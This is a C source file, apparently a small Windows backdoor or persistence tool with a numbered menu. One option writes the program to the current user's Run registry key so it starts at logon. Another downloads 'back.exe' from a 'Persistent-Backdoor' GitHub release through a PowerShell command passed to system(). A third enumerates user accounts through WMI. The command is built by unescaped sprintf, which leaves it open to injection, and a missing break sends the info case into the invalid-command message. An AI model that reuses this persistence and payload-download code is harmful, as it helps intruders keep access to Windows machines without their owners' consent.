#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winreg.h>
#include <urlmon.h>
#include <lm.h>

#define COMMAND_BOOT 1
#define COMMAND_FILE 2
#define COMMAND_DOWNLOAD 3
#define COMMAND_INFO 4

void print_commands() {
    printf("Possible commands:\n");
    printf("%d - Boot\n", COMMAND_BOOT);
    printf("%d - File\n", COMMAND_FILE);
    printf("%d - Download\n", COMMAND_DOWNLOAD);
    printf("%d - System Info\n", COMMAND_INFO);
}

int set_startup_regkey(char* script_path) {
    HKEY hKey;
    LONG create_status = RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
    if (create_status != ERROR_SUCCESS) {
        printf("Error creating registry key.\n");
        return create_status;
    }

    char* reg_value_name = "MyScript";
    char reg_value_data[MAX_PATH];
    snprintf(reg_value_data, MAX_PATH, "\"%s\"", script_path);

    LONG set_status = RegSetValueEx(hKey, reg_value_name, 0, REG_SZ, (BYTE*)reg_value_data, strlen(reg_value_data));
    if (set_status != ERROR_SUCCESS) {
        printf("Error setting registry key value.\n");
    }

    RegCloseKey(hKey);
    return set_status;
}

void createTextFile(const char* filename, const char* content) {
    FILE* file = fopen(filename, "w");
    if (file != NULL) {
        fprintf(file, "%s", content);
        fclose(file);
    } else {
        printf("Error creating file %s", filename);
    }
}


int downloadFile(const char* url, const char* filename) {
    char command[1024];
    sprintf(command, "powershell -Command (new-object System.Net.WebClient).DownloadFile('%s', '%s')", url, filename);
    return system(command);
}



int printUsersInfo() {
    char command[] = "powershell -command \"Get-WmiObject Win32_UserAccount | Select Name\"";
    char output[1024];
    FILE* fp = _popen(command, "r");
    if (fp == NULL) {
        printf("Failed to execute PowerShell command.\n");
        return 1;
    }
    while (fgets(output, sizeof(output), fp) != NULL) {
        printf("%s", output);
    }
    _pclose(fp);
    return 0;
}



int main() {
    int command;
    char script_path[MAX_PATH];
    memset(script_path, 0, MAX_PATH);
    GetModuleFileName(NULL, script_path, MAX_PATH);
    char script_dir[MAX_PATH];
    strncpy(script_dir, script_path, strrchr(script_path, '\\') - script_path + 1);

    do {
        print_commands();
        printf("Enter command: ");
        scanf("%d", &command);

        switch (command) {
            case COMMAND_BOOT:
                if (set_startup_regkey(script_path) == ERROR_SUCCESS) {
                    printf("Registry key set successfully.\n");
                }
                break;

            case COMMAND_FILE:
	        createTextFile("example.txt", "This is an example text file.");
                break;

            case COMMAND_DOWNLOAD:
                downloadFile("https://github.com/PolGs/Persistent-Backdoor/releases/download/0.12/back.exe", "back.exe");
                break;
	    case COMMAND_INFO:
	    	printUsersInfo();
            default:
                printf("Invalid command.\n");
        }
    } while (1);

    return 0;
}
